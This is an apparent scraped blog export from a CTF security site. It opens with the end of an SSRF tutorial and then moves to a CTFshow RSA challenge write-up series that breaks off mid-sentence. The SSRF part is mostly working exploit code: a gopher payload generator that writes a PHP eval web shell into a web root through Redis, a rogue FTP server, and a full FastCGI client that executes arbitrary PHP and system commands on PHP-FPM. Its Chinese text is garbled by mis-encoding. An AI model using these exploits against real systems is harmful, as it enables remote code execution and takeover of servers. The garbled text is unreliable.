conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # USER aaa\\r\\n å®¢æˆ·ç«¯ä¼ æ¥ç”¨æˆ·å if count == 1: conn.send(b&quot;220 ready\\n&quot;) else: conn.send(b&quot;200 ready\\n&quot;) print(conn.recv(20)) # TYPE I\\r\\n å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯ä»¥ä»€ä¹ˆæ ¼å¼ä¼ è¾“æ•°æ®ï¼ŒTYPE Iè¡¨ç¤ºäºŒè¿›åˆ¶ï¼Œ TYPE Aè¡¨ç¤ºæ–‡æœ¬ if count == 1: conn.send(b&quot;215 \\n&quot;) else: conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # SIZE /123\\r\\n å®¢æˆ·ç«¯è¯¢é—®æ–‡ä»¶/123çš„å¤§å° if count == 1: conn.send(b&quot;213 3 \\n&quot;) else: conn.send(b&quot;300 \\n&quot;) print(conn.recv(20)) # EPSV\\r\\n&#x27; conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # PASV\\r\\n å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯è¿›å…¥è¢«åŠ¨è¿æ¥æ¨¡å¼ if count == 1: conn.send(b&quot;227 192,168,160,129,4,210\\n&quot;) # æœåŠ¡ç«¯å‘Šè¯‰å®¢æˆ·ç«¯éœ€è¦åˆ°å“ªä¸ªip:portå»è·å–æ•°æ®,ip,portéƒ½æ˜¯ç”¨é€—å·éš”å¼€ï¼Œå…¶ä¸­ç«¯å£çš„è®¡ç®—è§„åˆ™ä¸ºï¼š4*256+210=1234 else: conn.send(b&quot;227 127,0,0,1,24,235\\n&quot;) # ç«¯å£è®¡ç®—è§„åˆ™ï¼š24*256+235=9000 print(conn.recv(20)) # ç¬¬ä¸€æ¬¡è¿æ¥ä¼šæ”¶åˆ°å‘½ä»¤RETR /123\\r\\nï¼Œç¬¬äºŒæ¬¡è¿æ¥ä¼šæ”¶åˆ°STOR /123\\r\\n if count == 1: conn.send(b&quot;125 \\n&quot;) # å‘Šè¯‰å®¢æˆ·ç«¯å¯ä»¥å¼€å§‹æ•°æ®é“¾æ¥äº† # æ–°å»ºä¸€ä¸ªsocketç»™æœåŠ¡ç«¯è¿”å›æˆ‘ä»¬çš„payload print(&quot;å»ºç«‹è¿æ¥!&quot;) conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(&quot;æ–­å¼€è¿æ¥!&quot;) else: conn.send(b&quot;150 \\n&quot;) print(conn.recv(20)) exit() # ç¬¬ä¸€æ¬¡è¿æ¥æ˜¯ä¸‹è½½æ–‡ä»¶ï¼Œéœ€è¦å‘Šè¯‰å®¢æˆ·ç«¯ä¸‹è½½å·²ç»ç»“æŸ if count == 1: conn.send(b&quot;226 \\n&quot;) conn.close() count += 1 12345678910111213141516171819202122232425262728293031323334353637# è„šæœ¬2# å†™å…¥shellimport urllib.parseprotocol = &quot;gopher://&quot;ip = &quot;127.0.0.1&quot;port = &quot;6379&quot;shell = &quot;\\n\\n&lt;?php eval($_POST[\\&quot;f4ke\\&quot;]);?&gt;\\n\\n&quot;filename = &quot;5he1l.php&quot;path = &quot;/var/www/html&quot;passwd = &quot;&quot;cmd = [&quot;auth 123123&quot;, &quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot;, &quot;quit&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload = protocol + ip + &quot;:&quot; + port + &quot;/_&quot;def redis_format(arr): CRLF = &quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd = &quot;&quot; cmd += &quot;*&quot; + str(len(redis_arr)) for x in redis_arr: cmd += CRLF + &quot;$&quot; + str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)))) + CRLF + x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd += CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.parse.quote(redis_format(x)) # print(payload) print(urllib.parse.quote(payload)) â€‹ PHP-FPM / FastCGIFastCGIæ˜¯ä¸€ä¸ªåè®®ï¼ŒPHP-FPMæ˜¯å®ç°äº†FastCGIåè®®çš„ç¨‹åºï¼Œå…¨ç§°PHP FastCGI Process Managerï¼Œå³PHP FastCGIçš„è¿›ç¨‹ç®¡ç†å™¨ï¼Œè¿è¡Œåœ¨é»˜è®¤è¿è¡Œåœ¨9000ç«¯å£ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254import socketimport randomimport argparseimport sysfrom io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False #åˆ¤æ–­python ç‰ˆæœ¬ def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;) def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return s class FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) # 1 --65535 self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) self.sock.send(request) self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27; return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port) if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; response = client.request(params, content) print(force_text(response)) # python fpm.py -c &quot;&lt;?php system(&#x27;ls /&#x27;);?&gt;&quot; -p 12345 127.0.0.1 /var/www/html/index.php å°†æ•°æ®URLä¸¤æ¬¡ç¼–ç ï¼š 123456# -*- coding: UTF-8 -*-from urllib.parse import quote, unquote, urlencodefile= open(&#x27;1.txt&#x27;,&#x27;rb&#x27;)payload= file.read()payload= quote(payload).replace(&quot;%0A&quot;,&quot;%0A%0D&quot;)print(&quot;gopher://127.0.0.1:9000/_&quot;+quote(payload)) â€‹ å‚è€ƒSSRF payloads","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"https://lazzzaro.github.io/tags/SSRF/"}],"author":"Lazzaro"},{"title":"CTFshowä¾›é¢˜ unusualrsaç³»åˆ—","slug":"other-CTFshowä¾›é¢˜-unusualrsaç³»åˆ—","date":"2020-09-01T15:13:24.000Z","updated":"2021-10-16T16:24:39.924Z","comments":true,"path":"2020/09/01/other-CTFshowä¾›é¢˜-unusualrsaç³»åˆ—/","permalink":"https://lazzzaro.github.io/2020/09/01/other-CTFshow%E4%BE%9B%E9%A2%98-unusualrsa%E7%B3%BB%E5%88%97/","excerpt":"","text":"â€‹ çœ‹åˆ°CTFshowä¸Šæ–°ä¸Šçš„easyrsaåŠfunnyrsaç³»åˆ—é¢˜ï¼Œæ‰‹ç—’å‡ºäº†5é“æ¯”è¾ƒé«˜é˜¶çš„unusualrsaç³»åˆ—é¢˜ã€‚ åœ¨æ­¤ä»…æä¾›æ€è·¯ä»¥è¾…åŠ©ï¼Œä»£ç å®ç°ç”±è¯»è€…è‡ªè¡ŒæŸ¥æ‰¾/å­¦ä¹ /å®Œæˆ/è‡´ç”¨ã€‚å¦‚æœ‰ç–‘é—®ï¼Œæ¬¢è¿ç•™è¨€ã€‚ â€‹ unusualrsa1æ˜æ–‡ $m$ é«˜ä½æ³„éœ²ï¼Œæ³„éœ²éƒ¨åˆ†ä½æ•°ä¸º $2044-315=1729$ï¼Œå‰éƒ¨åˆ†æ·»åŠ  $208$ ä½éšæœºå­—ç¬¦åšpaddingä»¥é˜²æ­¢ç›´æ¥ä» $c$ è¿˜åŸå‡ºéƒ¨åˆ† $m$ ä¸­çš„å­—ç¬¦ã€‚å¯é‡‡ç”¨Coppersmithæ”»å‡»ä¸­å·²çŸ¥æ˜æ–‡é«˜ä½æ”»å‡»æ–¹æ³•ã€‚ ç®—æ³•è¯´æ˜ å‡è®¾æˆ‘ä»¬é¦–å…ˆåŠ å¯†äº†æ¶ˆæ¯ $m$ï¼Œå¦‚ä¸‹ $C\\equiv m^e \\bmod N$ å¹¶ä¸”æˆ‘ä»¬å‡è®¾æˆ‘ä»¬çŸ¥é“æ¶ˆæ¯ $m$ çš„å¾ˆå¤§çš„ä¸€éƒ¨åˆ† $m_0$ï¼Œå³ $m=m_0+x$ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“ $x$ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±æœ‰å¯èƒ½é€šè¿‡è¯¥æ–¹æ³•è¿›è¡Œæ¢å¤æ¶ˆæ¯ã€‚è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“çš„ $x$ å…¶å®å°±æ˜¯å¤šé¡¹å¼çš„æ ¹ï¼Œéœ€è¦æ»¡è¶³ Coppersmith çš„çº¦æŸã€‚ å½“ $e$ è¶³å¤Ÿå°ï¼Œä¸”éƒ¨åˆ†æ˜æ–‡æ³„éœ²æ—¶ï¼Œå¯ä»¥é‡‡ç”¨Coppersmithå•å˜é‡æ¨¡ç­‰å¼çš„æ”»å‡»ï¼Œå¦‚ä¸‹ï¼š $c=m^{e}\\bmod n=(mbar+x_{0})^{e}\\bmod n$ï¼Œå…¶ä¸­ $mbar = (m &gt;&gt; kbits) &lt;&lt; kbits$ å½“ $\\vert x_{0}\\vert\\leq N^{\\frac{1}{e}}$ æ—¶ï¼Œå¯ä»¥åœ¨ $\\log N$ å’Œ $e$ çš„å¤šé¡¹å¼æ—¶é—´å†…æ±‚å‡º $x_0$ã€‚ â€‹ unusualrsa2 Related Message Attack æ­£ç¡®ç†è§£lambdaå‡½æ•°åŠreduceå‡½æ•°çš„æ¦‚å¿µï¼Œå‘ç°reduce(lambda xxx,[yyy,zzz])å®é™…å°±æ˜¯å¯¹listå‚æ•°ä»å¤´å…ƒç´ è‡³å°¾å…ƒç´ åº”ç”¨ä¸€élambdaåŒ¿åå‡½æ•°çš„æ“ä½œï¼Œå¾—åˆ°æœ€ç»ˆç»“æœã€‚ ç¬¬ä¸€æ­¥ï¼Œassertå‡½æ•°ç”¨äºç¡®å®šxåŠyä¸¤ä¸ªlistçš„å€¼ï¼ˆè§£ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ï¼‰ï¼Œå‹¿ä¸åŒ¿åå‡½æ•°çš„å‚æ•°åæ··æ·†ï¼› ç¬¬äºŒæ­¥ï¼Œpow(2*m+3,17,n)åŠpow(4*m+11,17,n)å¯¹åº”è¾“å‡ºç»“æœï¼š $c_1=(2m+3)^{17} \\pmod n \\\\ c_2=(4m+11)^{17} \\pmod n$ ç¬¬ä¸‰æ­¥ï¼Œé‡‡ç”¨Coppersmithâ€™s Short-pad Attack &amp; Related Message Attackï¼ˆåˆç§°Franklin-Reiteræ”»å‡»ï¼‰ï¼Œå…¶ä¸­æ­¤é¢˜çš„ $4m+11$ å¯ä»¥ç­‰ä»·æ„é€ ä¸ºï¼š $4m+11=2\\cdot(2m+3)+5$ã€‚ ç®—æ³•è¯´æ˜ ç›®å‰åœ¨å¤§éƒ¨åˆ†æ¶ˆæ¯åŠ å¯†ä¹‹å‰éƒ½ä¼šè¿›è¡Œ paddingï¼Œä½†æ˜¯å¦‚æœ padding çš„é•¿åº¦è¿‡çŸ­ï¼ˆ$m \\in (0,\\lfloor\\frac{n.nbits()}{e^2}\\rfloor]$ï¼‰ï¼Œä¹Ÿæœ‰å¯èƒ½è¢«å¾ˆå®¹æ˜“åœ°æ”»å‡»ã€‚ è¿™é‡Œæ‰€è°“ padding è¿‡çŸ­ï¼Œå…¶å®å°±æ˜¯å¯¹åº”çš„å¤šé¡¹å¼çš„æ ¹ä¼šè¿‡å°ã€‚ å½“ Alice ä½¿ç”¨åŒä¸€å…¬é’¥å¯¹ä¸¤ä¸ªå…·æœ‰æŸç§çº¿æ€§å…³ç³»çš„æ¶ˆæ¯ $M_1$ ä¸ $M_2$ è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å°†åŠ å¯†åçš„æ¶ˆæ¯ $C_1$ï¼Œ$C_2$ å‘é€ç»™äº† Bob æ—¶ï¼Œæˆ‘ä»¬å°±å¯èƒ½å¯ä»¥è·å¾—å¯¹åº”çš„æ¶ˆæ¯ $M_1$ ä¸ $M_2$ ã€‚è¿™é‡Œæˆ‘ä»¬å‡è®¾æ¨¡æ•°ä¸º $N$ï¼Œä¸¤è€…ä¹‹é—´çš„çº¿æ€§å…³ç³»å¦‚ä¸‹ï¼š $M_1 \\equiv f(M_2) \\bmod N$ å…¶ä¸­ $f$ ä¸ºä¸€ä¸ªçº¿æ€§å‡½æ•°ï¼Œæ¯”å¦‚è¯´ $f=ax+b$ã€‚ åœ¨å…·æœ‰è¾ƒå°é”™è¯¯æ¦‚ç‡ä¸‹çš„æƒ…å†µä¸‹ï¼Œå…¶å¤æ‚åº¦ä¸º $O(e\\log^2N)$ã€‚ è¿™ä¸€æ”»å‡»ç”± Franklinä¸Reiter æå‡ºã€‚ â€‹ unusualrsa3å¤šé¡¹å¼RSAï¼Œæ•´æ•°RSAçš„å˜ç§ï¼Œå€ŸåŠ©Sageå·¥å…·æ±‚è§£ã€‚ å®šä¹‰ä¸åŸç† åœ¨æœ‰é™åŸŸä¸Šé€‰å–ä¸¤ä¸ªä¸å¯çº¦å¤šé¡¹å¼ $g(p),g(q)$ï¼Œ$g(n)=g(p) \\cdot g(q)$ï¼Œè®¡ç®—å‡º $g(n)$ çš„æ¬§æ‹‰å‡½æ•° $\\varphi(g(n))=\\varphi$ï¼Œ é€‰å–ä¸€ä¸ªæ•´æ•° $e$ ä½œä¸ºå…¬é’¥ï¼Œ$e$ ä¸ $\\varphi$ æ˜¯äº’ç´ çš„ï¼Œé‚£ä¹ˆå¯¹äºæ˜æ–‡ $g(m)$ï¼ŒåŠ å¯†è¿‡ç¨‹ä¸º $g(m)^e \\equiv g(c) \\pmod {g(n)}$ï¼Œ è®¡ç®—ç§é’¥ $d$ æ»¡è¶³ $ed \\equiv 1 \\pmod \\varphi$ï¼Œåˆ™ $g(c)^d \\equiv (g(m)^e)^d \\equiv g(m)^{ed} \\equiv g(m)^{\\varphi+1} \\pmod {g(n)}$ï¼Œ åŒæ ·è€ƒè™‘ $g(n)$ ä¸ $g(m)$ äº’ç´ ï¼Œæ¬§æ‹‰å®šç†å¯¹äºå¤šé¡¹å¼äº¦æˆç«‹ï¼Œ å¾—åˆ° $g(m)^{\\varphi+1} \\equiv g(m) \\pmod {g(n)}$ï¼Œæ‰€ä»¥ $g(c)^d \\equiv g(m) \\pmod {g(n)}$ã€‚ æ˜¾ç„¶RSAå¯¹äºæ•´æ•°çš„ä½“åˆ¶å¯ä»¥é€‚ç”¨äºæœ‰é™åŸŸä¸Šçš„å¤šé¡¹å¼ã€‚ æ³¨æ„ å¯¹äºç´ æ•° $x$ï¼Œ$\\varphi(x)=x-1$ï¼Œä½†æ˜¯å¯¹äºä¸å¯çº¦å¤šé¡¹å¼ $g(x)$ï¼Œ$\\varphi(g(x))=p^n-1$ã€‚ï¼ˆæ­¤ $p$ ä¸º $GF(p)$ çš„æ¨¡ï¼Œæ­¤ $n$ ä¸ºå¤šé¡¹å¼æœ€é«˜é¡¹æ¬¡æ•°ï¼‰ åŸå› ï¼š ç”±æ¬§æ‹‰å‡½æ•°å®šä¹‰æœ¬èº«ï¼Œæ¬§æ‹‰å‡½æ•°æ˜¯å°äº $n$ çš„æ‰€æœ‰ä¸ $n$ äº’è´¨çš„æ•°çš„ä¸ªæ•°ã€‚ å¤šé¡¹å¼çš„æ¬§æ‹‰å‡½æ•°åˆ™ç±»ä¼¼ï¼Œè¡¨ç¤ºä¸é«˜äº $g(x)$ å¹‚çº§çš„ç¯å†…æ‰€æœ‰å¤šé¡¹å¼ä¸­ï¼Œä¸ $g(x)$ æ— å…¬å› å¼ï¼ˆé1ï¼‰çš„å…¶ä»–å¤šé¡¹å¼çš„ä¸ªæ•°ï¼Œæ‰€ä»¥æ¯ä¸€ä¸ªä¸é«˜äº $g(x)$ å¹‚çº§çš„ç¯å†…å¤šé¡¹å¼ï¼ˆé™¤äº†å®ƒè‡ªå·±ï¼‰å‡æ»¡è¶³æ­¤æ¡ä»¶ã€‚ â€‹ unusualrsa4 Hint1: ed=1+kÏ† æ¯”è¾ƒeä¸kæ¯”ç‰¹ä½æ•° è”ç«‹ä¸¤å¼ï¼Œå°è¯•åŒ–ç®€ (inv(q,p)Â·Ï†) mod p Hint2: è´¹é©¬å°å®šç† å¯¹äºä»»æ„ r,k1,k2ï¼Œå½“ k2 ä¸º k1 å› å­æ—¶ï¼Œr mod k2=(r mod k1) mod k2 å·²çŸ¥ $e,d,inv(q,p),c$ï¼Œä¸” $p,q$ åŒæ¯”ç‰¹ä½æ•°ã€‚ ä»¤ $cf=q^{-1} \\bmod p$ï¼Œæœ‰ $q\\cdot cf=1 \\pmod p$ã€‚ $ed=1+k(p-1)(q-1)$ï¼Œ æ¯”è¾ƒæ¯”ç‰¹ä½æ•°ï¼Œ$k$ ä¸ $e$ åŒé•¿ï¼Œå¯çˆ†ç ´ $k$ï¼Œå¾— $\\varphi(n)=(p-1)(q-1)=\\cfrac{ed-1}{k}$ï¼› ä¸Šå¼ $\\varphi(n) =(p-1)(q-1) \\pmod p=-(q-1) \\pmod p$ï¼Œ ç»“åˆ $q\\cdot cf=1 \\pmod p$ï¼Œå³ $q\\cdot cf-1=0 \\pmod p$ï¼Œ è”ç«‹ï¼š $\\begin{eqnarray} \\varphi(n)&amp;=&amp;(p-1)(q-1)\\\\&amp;=&amp;pq-p-q+1\\\\&amp;=&amp;n-p-q+1 \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n)&amp;=&amp;cf\\cdot(n-p-q+1)\\\\&amp;=&amp;cf\\cdot n-cf\\cdot p-cf\\cdot q+cf \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n) \\bmod p&amp;=&amp;(cf\\cdot n-cf\\cdot p-cf\\cdot q+cf) \\bmod p\\\\&amp;=&amp;0-0-(cf\\cdot q)+cf \\bmod p\\\\&amp;=&amp;-1+cf \\bmod p \\end{eqnarray}$ æœ‰ $1+cf\\cdot \\varphi(n)-cf=0\\pmod p$ï¼Œ å³$x=1+cf\\cdot \\varphi(n)-cf$ èƒ½è¢« $p$ æ•´é™¤ï¼› ç”±è´¹é©¬å°å®šç†ï¼Œå­˜åœ¨ $r$ æ»¡è¶³ $r^{p-1}=1 \\pmod p$ï¼Œ $\\begin{eqnarray}r^{\\varphi(n)}&amp;=&amp;(r^{(p-1)})^{(q-1)}\\\\&amp;=&amp;1^{(q-1)} \\pmod p\\\\&amp;=&amp;1 \\pmod p \\end{eqnarray}$ï¼Œ å› å¯¹äºä»»æ„ $r,k_1,k_2$ï¼Œå½“ $k_2$ ä¸º $k_1$ å› å­æ—¶ï¼Œ$r \\bmod k_2=(r \\bmod k_1) \\bmod k_2$ï¼Œ æ•… $r^{\\varphi(n)} \\bmod p=(r^{\\varphi(n)} \\bmod x) \\bmod p=1 \\bmod p=kp$ï¼Œ å·²çŸ¥ $\\varphi(n)$ï¼Œç”± $(r^{\\varphi(n)} \\bmod x) \\bmod p=kp$ å¯å¾—åˆ°å¤šç»„ $p$ çš„ä¹˜ç§¯ï¼Œè®¡ç®— $\\gcd$ å¯å¾—åˆ° $p$ï¼› ç”± $q\\cdot cf=1 \\pmod p$ æ±‚æ¨¡é€†å¯å¾— $q$ï¼Œå†ç”¨ $c$ è®¡ç®—å‡º $m$ã€‚ â€‹ unusualrsa5 æœ‰é™åŸŸ n-th root å‘ç° $\\gcd(e,\\varphi) =e$ ä¸” $e\\mid (p-1),e\\mid (q-1)$ã€‚ è§£é¢˜æ€è·¯å³æ±‚è§£ $m \\bmod p$ å’Œ $m \\bmod q$ ï¼Œå†é€šè¿‡CRTè¿˜åŸ $m \\bmod n$ã€‚ è¿™é‡Œ $e$ ä¸ $p-1$ å’Œ $q-1$ éƒ½ä¸äº’ç´ ï¼Œä¸èƒ½ç®€å•åœ°æ±‚ä¸ªé€†å…ƒå°±å®Œäº‹ï¼Œä¸»è¦éš¾ç‚¹åˆ™æ˜¯åœ¨æœ‰é™åŸŸ $GF(p)$ ä¸Šæ±‚ $e$ æ¬¡æ ¹ã€‚ åœ¨æœ‰é™åŸŸä¸Šæ±‚r-th rootæœ‰ä¸¤ä¸ªå¸¸è§ç®—æ³•ï¼šAdleman-Manders-Miller algorithm (AMM) å’ŒCipolla-Lehmer algorithm (CL)ï¼Œè¿™é‡Œé‡‡ç”¨AMMç®—æ³•ï¼ˆpaperï¼‰ã€‚ è¿™ä¸ªç®—æ³•åªèƒ½å¼€å‡ºä¸€ä¸ªæ ¹ï¼Œå®é™…ä¸Šå¼€ $e$ æ¬¡æ–¹ï¼Œæœ€å¤šä¼šæœ‰ $e$ ä¸ªæ ¹ï¼ˆè¿™é¢˜çš„æƒ…å†µä¸‹æœ‰0x1337ä¸ªæ ¹ï¼‰ã€‚ å¦‚ä½•æ‰¾åˆ°å…¶ä»–æ ¹ï¼Ÿ StackOverflow â€“ Cube root modulo P ç»™å‡ºäº†æ–¹æ³•ã€‚ å¦‚ä½•æ‰¾åˆ°æ‰€æœ‰çš„primitive n-th root of 1? StackExchange â€“ Finding the n-th root of unity in a finite field ç»™å‡ºäº†æ–¹æ³•ã€‚ ä»¥ e=0x1337â€‹ ä¸ºä¾‹ï¼š å…ˆç”¨Adleman-Manders-Miller rth Root Extraction Methodåœ¨ $GF(p)$ å’Œ $GF(q)$ ä¸Šå¯¹ $c$ å¼€ $e$ æ¬¡æ–¹æ 